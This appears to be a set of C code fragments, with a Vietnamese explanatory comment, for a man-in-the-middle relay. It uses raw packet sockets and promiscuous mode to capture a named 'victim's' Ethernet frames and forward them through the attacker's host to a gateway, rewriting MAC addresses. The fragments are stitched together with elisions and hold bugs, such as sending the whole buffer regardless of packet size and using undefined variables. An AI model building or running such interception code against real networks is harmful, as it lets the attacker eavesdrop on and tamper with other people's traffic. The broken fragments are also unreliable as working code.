#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <sys/ioctl.h>
#include <net/if.h>

#define MAX_PACKET_SIZE 8192

int main() {
    int sockfd, forward_sockfd;
    char buffer[MAX_PACKET_SIZE];
    struct sockaddr_ll victim_addr, gateway_addr;
    socklen_t addr_size;

    // Create a raw socket for capturing packets
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("Failed to create socket");
        exit(EXIT_FAILURE);
    }

    // Create a raw socket for forwarding packets
    forward_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (forward_sockfd < 0) {
        perror("Failed to create socket");
        exit(EXIT_FAILURE);
    }

    // Bind the capture socket to the victim's interface
    memset(&victim_addr, 0, sizeof(victim_addr));
    victim_addr.sll_ifindex = if_nametoindex("victimInterface"); // Replace with your victim interface name
    victim_addr.sll_protocol = htons(ETH_P_ALL);
    if (bind(sockfd, (struct sockaddr*)&victim_addr, sizeof(victim_addr)) < 0) {
        perror("Failed to bind socket");
        exit(EXIT_FAILURE);
    }

    while (1) {
        memset(buffer, 0, MAX_PACKET_SIZE);

        // Capture a packet from the victim's interface
        if (recvfrom(sockfd, buffer, MAX_PACKET_SIZE, 0, NULL, NULL) < 0) {
            perror("Failed to receive packet");
            continue;
        }

        // Forward the packet to the gateway
        memset(&gateway_addr, 0, sizeof(gateway_addr));
        gateway_addr.sll_ifindex = if_nametoindex("gatewayInterface"); // Replace with your gateway interface name
        gateway_addr.sll_protocol = htons(ETH_P_ALL);
        if (sendto(forward_sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&gateway_addr, sizeof(gateway_addr)) < 0) {
            perror("Failed to send packet");
            continue;
        }
    }

    close(sockfd);
    close(forward_sockfd);

    return 0;
}




/*
Chương trình nhận một gói tin từ nạn nhân.
Nó kiểm tra xem gói tin có phải từ nạn nhân không bằng cách so sánh địa chỉ MAC nguồn trong header Ethernet với địa chỉ MAC của nạn nhân.
Nếu gói tin không từ nạn nhân, chương trình sẽ bỏ qua gói tin và tiếp tục vòng lặp.
Nếu gói tin từ nạn nhân, chương trình sẽ thay đổi địa chỉ MAC đích trong header Ethernet thành địa chỉ MAC của gateway.
Chương trình sau đó chuyển tiếp gói tin đến gateway.
Chương trình sau đó thay đổi địa chỉ MAC nguồn trong header Ethernet thành địa chỉ MAC của kẻ tấn công và địa chỉ MAC đích thành địa chỉ MAC của nạn nhân.
Cuối cùng, chương trình chuyển tiếp gói tin trở lại nạn nhân.
*/

// ...

while (1) {
    // Receive packet
    ssize_t packetSize = recvfrom(sockfd, buffer, ETH_FRAME_LEN, 0, NULL, NULL);
    if (packetSize < 0) {
        perror("recvfrom");
        continue;
    }

    // Check if the packet is from the victim
    struct ether_header* ethHeader = (struct ether_header*)buffer;
    if (memcmp(ethHeader->ether_shost, victimMAC, ETH_ALEN) == 0) {
        // Modify the destination MAC address to the gateway's MAC address
        memcpy(ethHeader->ether_dhost, gatewayMAC, ETH_ALEN);

        // Forward the packet to the gateway
        if (sendto(sockfd, buffer, packetSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0) {
            perror("sendto");
            continue;
        }
    }
    // Check if the packet is from the gateway
    else if (memcmp(ethHeader->ether_shost, gatewayMAC, ETH_ALEN) == 0) {
        // Modify the source MAC address to the attacker's MAC address
        memcpy(ethHeader->ether_shost, localMAC, ETH_ALEN);

        // Modify the destination MAC address to the victim's MAC address
        memcpy(ethHeader->ether_dhost, victimMAC, ETH_ALEN);

        // Forward the packet back to the victim
        if (sendto(sockfd, buffer, packetSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0) {
            perror("sendto");
            continue;
        }
    }
}





///////////
// ...

// Create a raw socket in promiscuous mode
sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
if (sockfd < 0) {
    perror("Failed to create socket");
    exit(EXIT_FAILURE);
}

// Set the socket to promiscuous mode
struct ifreq ifr;
strncpy(ifr.ifr_name, "wlp3s0", IFNAMSIZ); // Replace with your interface name
if (ioctl(sockfd, SIOCGIFFLAGS, &ifr) < 0) {
    perror("Failed to get interface flags");
    exit(EXIT_FAILURE);
}
ifr.ifr_flags |= IFF_PROMISC;
if (ioctl(sockfd, SIOCSIFFLAGS, &ifr) < 0) {
    perror("Failed to set interface to promiscuous mode");
    exit(EXIT_FAILURE);
}

while (1) {
    // Capture a packet
    if (recvfrom(sockfd, buffer, MAX_PACKET_SIZE, 0, NULL, NULL) < 0) {
        perror("Failed to receive packet");
        continue;
    }

    // Check if the packet is from the victim or to the gateway
    struct ether_header* ethHeader = (struct ether_header*)buffer;
    if (memcmp(ethHeader->ether_shost, victimMAC, ETH_ALEN) == 0 && memcmp(ethHeader->ether_dhost, gatewayMAC, ETH_ALEN) == 0) {
        // Forward the packet to the gateway
        if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&gateway_addr, sizeof(gateway_addr)) < 0) {
            perror("Failed to send packet");
            continue;
        }
    }
    // Check if the packet is from the gateway or to the victim
    else if (memcmp(ethHeader->ether_shost, gatewayMAC, ETH_ALEN) == 0 && memcmp(ethHeader->ether_dhost, victimMAC, ETH_ALEN) == 0) {
        // Forward the packet to the victim
        if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&victim_addr, sizeof(victim_addr)) < 0) {
            perror("Failed to send packet");
            continue;
        }
    }
}

// ...
